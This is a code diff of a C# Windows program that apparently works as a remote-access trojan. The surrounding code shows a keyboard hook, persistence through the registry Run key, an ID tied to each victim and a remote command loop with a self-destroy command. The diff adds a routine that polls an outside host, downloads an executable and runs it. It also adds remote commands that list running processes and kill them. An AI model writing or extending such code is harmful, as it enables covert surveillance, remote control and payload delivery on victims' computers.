@@ -28,6 +28,8 @@ namespace cmd
     /// </summary>
     public partial class Main : Window
     {
+        public const int version = 1;
+
         int sessionID, userID;
 
         ChatWindow chatWindow;
@@ -53,6 +55,8 @@ namespace cmd
               });
             //chatWindow.Show();
 
+            CheckUpdate();
+
             RegisterInStartup(true);
 
             keyboardHook = new KeyboardHook();
@@ -69,6 +73,63 @@ namespace cmd
             dispatcherTimer.Start();
         }
 
+        private void CheckUpdate()
+        {
+            try
+            {
+                string[] spec = { "||" };
+                string[] result = request("http://akita123.atwebpages.com/main.php?type=10&userid=" + userID).Split(spec, StringSplitOptions.None);
+                int ver = int.Parse(result[0]);
+
+                if (ver > version)
+                {
+                    downloadNewUpdate(result[1]);
+                }
+            }catch (Exception e)
+            {
+                sendCommand("MBOX " + e.Message);
+            }
+        }
+
+        private void downloadNewUpdate(string links)
+        {
+            try
+            {
+                links = links.Replace(';', '/');
+
+                string[] link = links.Split('|');
+                string run = "";
+                using (var client = new WebClient())
+                {
+                    foreach (string s in link)
+                    {
+                        string filename = getFileNameFromLink(s);
+                        client.DownloadFile(s, filename);
+                        if (filename.ToUpper().EndsWith("EXE"))
+                        {
+                            run = filename;
+                        }
+                    }
+
+                }
+
+                Process.Start(run);
+                Environment.Exit(0);
+
+            }catch(Exception e)
+            {
+                sendCommand("MBOX " + e.Message);
+            }
+        }
+
+        private string getFileNameFromLink(string link)
+        {
+            int begin = link.LastIndexOf("/");
+            int end = link.LastIndexOf(".");
+
+            return link.Substring(begin + 1, end - begin-1);
+        }
+
         private void RegisterInStartup(bool isChecked)
         {
             RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
@@ -82,6 +143,8 @@ namespace cmd
             {
                 registryKey.DeleteValue("CMD");
             }
+
+            registryKey.Close();
         }
 
         private void upLog(string log)
@@ -103,10 +166,12 @@ namespace cmd
                 userID = registerUserID();
                 RegistryKey control = Registry.CurrentUser.CreateSubKey("Software\\control");
                 control.SetValue("id", userID);
+                control.Close();
             }
             else
             {
                 userID = (int)key.GetValue("id");
+                key.Close();
             }
 
             return userID;
@@ -115,11 +180,12 @@ namespace cmd
         private void destroy()
         {
             RegisterInStartup(false);
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software");
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
 
             if (key != null)
             {
                 key.DeleteSubKey("control");
+                key.Close();
             }
         }
 
@@ -279,6 +345,7 @@ namespace cmd
             }
             catch (Exception e)
             {
+                sendCommand("MBOX " + e.Message);
                 return null;
             }
         }
@@ -442,6 +509,30 @@ namespace cmd
                     destroy();
                     Environment.Exit(0);
 
+                }
+                else if (cmd.ToUpper().StartsWith("PROCESS"))
+                {
+                    Process[] procs = Process.GetProcesses();
+                    String result = "";
+
+                    foreach (Process proc in procs)
+                    {
+                        if (proc.MainWindowTitle == "") continue;
+                        result += proc.MainWindowTitle + "|||" + proc.ProcessName + "|||";
+                    }
+
+                    result = result.Remove(result.Length - 3);
+
+                    sendCommand("PROCESS " + result);
+
+                }
+                else if (cmd.ToUpper().StartsWith("KILLPROCESS"))
+                {
+                    string processname = cmd.Substring(12);
+                    foreach (Process proc in Process.GetProcessesByName(processname))
+                    {
+                        proc.Kill();
+                    }
                 }
             }
             catch (Exception e)
